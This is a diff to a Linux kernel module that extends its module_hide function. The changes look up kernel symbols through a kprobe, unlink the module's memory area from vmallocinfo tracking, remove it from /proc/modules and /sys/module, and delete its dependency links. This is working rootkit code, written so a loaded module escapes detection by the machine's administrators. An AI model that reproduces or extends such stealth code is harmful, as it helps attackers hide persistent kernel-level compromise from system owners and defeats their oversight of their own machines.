@@ -19,11 +19,18 @@
 #include <linux/list.h>
 #include <linux/slab.h>     // Memory allocation (kfree)
 #include <linux/sysfs.h>    // Sysfs management
-
  
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0) 
 #define HAVE_PROC_OPS 
 #endif 
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
+#define KPROBE_LOOKUP 1
+#include <linux/kprobes.h>
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name",
+};
+#endif
  
 #define PROCFS_MAX_SIZE 2048UL 
 #define PROCFS_ENTRY_FILENAME "exianb" 
@@ -189,11 +196,48 @@ void module_hide(void) {
     sect_attrs_bkp = THIS_MODULE->sect_attrs;
     notes_attrs_bkp = THIS_MODULE->notes_attrs;
 
+    struct vmap_area *va, *vtmp;
+    struct module_use *use, *tmp;
+    struct list_head *_vmap_area_list;
+    struct rb_root *_vmap_area_root;
+
+#ifdef KPROBE_LOOKUP
+    unsigned long (*kallsyms_lookup_name)(const char *name);
+    if (register_kprobe(&kp) < 0)
+        return;
+    kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
+    unregister_kprobe(&kp);
+#endif
+
+    _vmap_area_list =
+        (struct list_head *) kallsyms_lookup_name("vmap_area_list");
+    _vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
+
+    /* hidden from /proc/vmallocinfo */
+    list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
+        if ((unsigned long) THIS_MODULE > va->va_start &&
+            (unsigned long) THIS_MODULE < va->va_end) {
+            list_del(&va->list);
+            /* remove from red-black tree */
+            rb_erase(&va->rb_node, _vmap_area_root);
+        }
+    }
+
     // Remove from /proc/modules
-    list_del(&THIS_MODULE->list);
+    // list_del(&THIS_MODULE->list);
+    list_del_init(&THIS_MODULE->list);
 
     // Remove from /sys/module
     kobject_del(&THIS_MODULE->mkobj.kobj);
+
+    /* decouple the dependency */
+    list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list,
+                              target_list) {
+        list_del(&use->source_list);
+        list_del(&use->target_list);
+        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
+        kfree(use);
+    }
     
     THIS_MODULE->list.prev = (list_head *)0xDEAD000000000122LL;
     THIS_MODULE->state = MODULE_STATE_UNFORMED; // Change state to prevent loading
